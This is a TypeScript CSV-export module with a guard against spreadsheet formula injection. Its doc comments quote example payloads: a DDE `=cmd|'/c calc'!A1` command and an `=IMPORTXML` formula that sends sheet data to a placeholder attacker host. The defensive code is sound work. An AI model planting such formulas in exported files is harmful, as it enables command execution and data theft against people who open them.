export interface CsvColumn<T = unknown> {
  caption: string;
  accessor: (row: T) => unknown;
  /** Optional text formatter (falls back to `String(value)`). */
  format?: (value: unknown) => string;
}

export interface CsvOptions {
  /** Field separator. Default `,`. */
  separator?: string;
  /** Prefix with a UTF-8 BOM so Excel detects the encoding. Default true. */
  bom?: boolean;
  /** Include the caption header row. Default true. */
  header?: boolean;
  /**
   * Neutralize cells a spreadsheet would evaluate as a formula. Default true —
   * see {@link guardCsvFormula}. Set to `false` only when the exported data is
   * trusted **and** the file is consumed by a parser rather than a spreadsheet.
   */
  formulaGuard?: boolean;
}

/**
 * Characters that make a spreadsheet read a text cell as a formula.
 *
 * `\t` and `\r` are in the list because Excel strips leading whitespace before
 * it decides, so `\t=cmd|…` is a formula to Excel and a plain string to a
 * naive check.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

/** A cell that is just a number — `-5`, `+3.1`, `1e9` — and so not a formula. */
const PLAIN_NUMBER = /^[+-]?(\d+\.?\d*|\.\d+)([eE][+-]?\d+)?$/;

/**
 * Defuses CSV formula injection (CWE-1236).
 *
 * A CSV file is data, but Excel, LibreOffice and Google Sheets evaluate any
 * cell that opens with `=`, `+`, `-` or `@`. A grid that exports rows a user
 * typed therefore hands the next person to open the file a live formula —
 * historically `=cmd|'/c calc'!A1` for DDE command execution, and still
 * `=HYPERLINK(...)` or `=IMPORTXML("http://attacker/?"&A1)` to exfiltrate the
 * sheet. The export is the injection point, so the export is where it is
 * stopped.
 *
 * The fix is the one every spreadsheet honors: a leading apostrophe, which
 * forces the cell to text and is not itself displayed. Numbers are left alone
 * so a `-5` column stays numeric, which is the whole reason a blanket prefix
 * is the wrong shape for this.
 */
export function guardCsvFormula(text: string): string {
  if (!FORMULA_LEAD.test(text) || PLAIN_NUMBER.test(text)) return text;
  return `'${text}`;
}

/**
 * RFC 4180 quoting for a single CSV cell (shared with the pivot exporter).
 * Pass `guardFormula: false` to skip the {@link guardCsvFormula} step.
 */
export function escapeCsvCell(
  text: string,
  separator: string,
  guardFormula = true,
): string {
  const cell = guardFormula ? guardCsvFormula(text) : text;
  if (
    cell.includes(separator) ||
    cell.includes('"') ||
    cell.includes('\n') ||
    cell.includes('\r')
  ) {
    return `"${cell.replace(/"/g, '""')}"`;
  }
  return cell;
}

/** Builds RFC 4180-style CSV output from rows + column definitions. */
export function buildCsv<T>(
  rows: readonly T[],
  columns: readonly CsvColumn<T>[],
  options: CsvOptions = {},
): string {
  const separator = options.separator ?? ',';
  const guard = options.formulaGuard !== false;
  const lines: string[] = [];
  if (options.header !== false) {
    lines.push(
      columns
        .map((column) => escapeCsvCell(column.caption, separator, guard))
        .join(separator),
    );
  }
  for (const row of rows) {
    lines.push(
      columns
        .map((column) => {
          const value = column.accessor(row);
          const text =
            value == null
              ? ''
              : column.format
                ? column.format(value)
                : String(value);
          return escapeCsvCell(text, separator, guard);
        })
        .join(separator),
    );
  }
  const body = lines.join('\r\n');
  return options.bom === false ? body : `\uFEFF${body}`;
}
